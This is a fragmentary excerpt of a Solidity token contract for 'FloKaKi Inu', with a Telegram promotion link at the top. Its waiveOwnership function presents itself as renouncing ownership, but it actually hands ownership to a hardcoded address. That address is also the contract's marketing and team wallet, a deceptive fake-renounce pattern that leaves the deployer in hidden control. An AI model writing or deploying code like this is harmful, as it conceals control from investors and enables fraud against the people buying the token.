...
/**
Telegram : https://t.me/+bDIcHzrk65IzNDBk
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xe1EEDA1D10Df0b1BD453F1c5C9aa5DdFB2BEA88D);
    }
...
contract FloKaKiInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "FloKaKi Inu";
    string private _symbol = "FLOKAKI INU";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xe1EEDA1D10Df0b1BD453F1c5C9aa5DdFB2BEA88D);
    address payable private teamWalletAddress = payable(0xe1EEDA1D10Df0b1BD453F1c5C9aa5DdFB2BEA88D);
